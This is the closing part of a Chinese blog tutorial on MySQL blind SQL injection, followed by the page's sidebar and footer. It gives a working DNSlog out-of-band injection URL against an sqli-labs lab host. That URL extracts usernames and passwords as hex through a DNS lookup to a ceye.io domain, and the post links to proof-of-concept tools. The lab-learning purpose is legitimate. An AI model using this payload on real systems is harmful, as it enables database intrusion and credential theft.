+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select hex(concat_ws(&apos;~&apos;,username,password)) from security.users limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-51.png" alt="mysql-51"></p>
+<p>44756D627E30经过hex decode后微Dumb~0</p>
+<p>Mysql Dnslog注入条件：<a href="https://www.cnblogs.com/p0pl4r/p/10581070.html" target="_blank" rel="noopener">https://www.cnblogs.com/p0pl4r/p/10581070.html</a></p>
+<h3 id="脚本执行Dnslog注入"><a href="#脚本执行Dnslog注入" class="headerlink" title="脚本执行Dnslog注入"></a>脚本执行Dnslog注入</h3><p>Python_poc：</p>
+<p><a href="https://github.com/ADOOO/DnslogSqlinj" target="_blank" rel="noopener">https://github.com/ADOOO/DnslogSqlinj</a></p>
+<p><a href="https://xz.aliyun.com/t/2359" target="_blank" rel="noopener">https://xz.aliyun.com/t/2359</a></p>
+<p>Sqlmap：</p>
+<p><a href="https://www.cnblogs.com/backlion/p/8984121.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8984121.html</a></p>
+<p>Dnslog对其他漏洞的使用：</p>
+<p><a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/01/17/Mysql注入之盲注/" title="Mysql注入之盲注">https://choge.top/2020/01/17/Mysql注入之盲注/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/mysql/" rel="tag"># mysql</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/01/16/Mysql之union注入、报错注入/" rel="next" title="Mysql之union注入、报错注入">
+                  <i class="fa fa-chevron-left"></i> Mysql之union注入、报错注入
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/" rel="prev" title="Mysql注入之宽字节注入、二次编码注入、二次注入">
+                  Mysql注入之宽字节注入、二次编码注入、二次注入 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔盲注"><span class="nav-number">1.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断语句"><span class="nav-number">1.1.</span> <span class="nav-text">判断语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔盲注实战"><span class="nav-number">1.2.</span> <span class="nav-text">布尔盲注实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用left判断"><span class="nav-number">1.2.1.</span> <span class="nav-text">使用left判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用regexp判断"><span class="nav-number">1.2.2.</span> <span class="nav-text">使用regexp判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用like判断"><span class="nav-number">1.2.3.</span> <span class="nav-text">使用like判断</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间盲注"><span class="nav-number">2.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#核心语法"><span class="nav-number">2.1.</span> <span class="nav-text">核心语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用sacii和substr判断"><span class="nav-number">2.1.1.</span> <span class="nav-text">使用sacii和substr判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用sleep判断"><span class="nav-number">2.1.2.</span> <span class="nav-text">使用sleep判断</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DnsLog注入"><span class="nav-number">3.</span> <span class="nav-text">DnsLog注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DnsLog注入平台"><span class="nav-number">3.1.</span> <span class="nav-text">DnsLog注入平台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本执行Dnslog注入"><span class="nav-number">3.2.</span> <span class="nav-text">脚本执行Dnslog注入</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
